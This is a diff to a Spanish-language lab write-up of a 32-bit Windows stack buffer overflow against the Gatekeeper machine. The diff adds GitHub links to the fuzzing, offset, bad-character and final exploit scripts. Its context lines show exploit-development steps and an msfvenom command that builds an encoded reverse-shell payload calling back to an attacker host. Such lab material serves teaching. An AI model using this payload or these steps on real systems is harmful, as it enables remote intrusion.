@@ -281,7 +281,7 @@ Para poder corromper el binario podríamos ir probando enviando una cadena con u
 ```sql
 python3 fuzzer.py 192.168.1.10 31337
 ```
-[fuzzer.py]()
+[fuzzer.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/fuzzer.py)
 
 ![Buffer Gatekeeper](/assets/images/fuzzergatekeeper.png)
 
@@ -314,7 +314,7 @@ Como pudimos ver al enviar una cadena de 150 bytes el binario se corrompe. Esta 
   ```python
   python obset.py 192.168.1.10 31337
   ```
-  [obset.py]()
+  [obset.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/obset.py)
 
   ![EIP Control Gatekeeper](/assets/images/eipcontrolGatekeeper.png)
 
@@ -341,7 +341,7 @@ Como pudimos ver al enviar una cadena de 150 bytes el binario se corrompe. Esta 
   ```python
   "A"*146 + "B"*4 + "C"*500
   ```
-  [obset.py]()
+  [eipcontrol.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/eipcontrol.py)
 
   ![Verificación del control del EIP](/assets/images/eipverificationGatekeeper.png)
 
@@ -380,7 +380,7 @@ El fichero `bytearray` nos servirá para copiar y pegar su contenido en nuestro 
 
 ### 5. Eliminando badchars
 
-Para este paso ejecutaremos [badChars.py]() hasta que no se nos muestre mas badchars.
+Para este paso ejecutaremos [badChars.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/badChars.py) hasta que no se nos muestre mas badchars.
 
 ```sql
 python badChars.py 192.168.1.10 31337
@@ -397,7 +397,7 @@ Para comparar necesitaremos el siguiente comando.
 
 ![Badchars gatekeeper](/assets/images/badcharsgate.png)
 
-Observamos que se nos lista dos badchars, el `00` y el `0a`, estos deberemos quitarlos de nuestra lista en el script [badChars.py]() y crear otra lista con `mona` pero quitando los dos badchars listados.
+Observamos que se nos lista dos badchars, el `00` y el `0a`, estos deberemos quitarlos de nuestra lista en el script [badChars.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/badChars.py) y crear otra lista con `mona` pero quitando los dos badchars listados.
 
 ```sql
 !mona bytearray -cpb "\x00\x0a"
@@ -436,7 +436,7 @@ De estas dos direcciones, podemos elegir cualquiera de las dos.
 
 Una vez hemos eliminado **todos** los badchars y teniendo una dirección al `ESP` podremos crear nuestra shell para poder obtener una conexión reversa hacia nuestro equipo de atacante.
 
-El resultado del siguiente comando lo debemos poner en nuestro script final [finalexploit.py]().
+El resultado del siguiente comando lo debemos poner en nuestro script final [finalexploit.py](https://github.com/hacknotes/h4ckn0tes/blob/main/Buffer%20Overflow/Windows/Stack%20Based%2032%20Bits%20(Gatekeeper)/finalexpolit.py).
 
 ```python
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a" -e x86/shikata_ga_nai -f c
